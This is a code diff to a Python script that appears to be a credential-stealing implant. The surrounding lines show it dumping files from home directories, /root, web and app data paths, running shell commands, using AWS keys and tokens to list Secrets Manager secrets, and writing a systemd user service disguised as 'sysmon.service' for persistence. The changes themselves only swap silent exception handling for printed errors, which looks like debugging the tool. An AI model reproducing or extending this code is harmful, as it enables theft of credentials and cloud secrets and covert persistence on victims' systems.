@@ -8,7 +8,7 @@ def emit(path):
         print(('\n=== '+path+' ===\n').encode())
         print(data)
         print(b'\n')
-    except OSError:pass
+    except OSError as e:print(e)
 
 def emit_glob(pattern):
     for p in glob.glob(pattern,recursive=True):emit(p)
@@ -20,7 +20,7 @@ def run(cmd):
             print(('\n=== CMD: '+cmd+' ===\n').encode())
             print(out)
             print(b'\n')
-    except Exception:pass
+    except Exception as e:print(e)
 
 def walk(roots,max_depth,match_fn):
     for root in roots:
@@ -37,7 +37,7 @@ homes=[]
 try:
     for e in os.scandir('/home'):
         if e.is_dir():homes.append(e.path)
-except OSError:pass
+except OSError as e:print(e)
 homes.append('/root')
 all_roots=homes+['/opt','/srv','/var/www','/app','/data','/var/lib','/tmp']
 
@@ -222,7 +222,7 @@ if AK and SK:
         AK=creds.get('AccessKeyId',AK)
         SK=creds.get('SecretAccessKey',SK)
         ST=creds.get('Token',ST)
-    except:pass
+    except Exception as e:print(e)
 
     sm=aws_req('POST','secretsmanager',REG,'/','Action=ListSecrets',
         {'Content-Type':'application/x-amz-json-1.1','X-Amz-Target':'secretsmanager.ListSecrets'},AK,SK,ST)
@@ -328,4 +328,4 @@ if not os.path.exists(script_path):
             with open(unit_path,'w') as f:f.write(unit)
             # subprocess.run(['systemctl','--user','daemon-reload'],capture_output=True,timeout=5)
             # subprocess.run(['systemctl','--user','enable','--now','sysmon.service'],capture_output=True,timeout=5)
-    except:pass
+    except Exception as e:print(e)
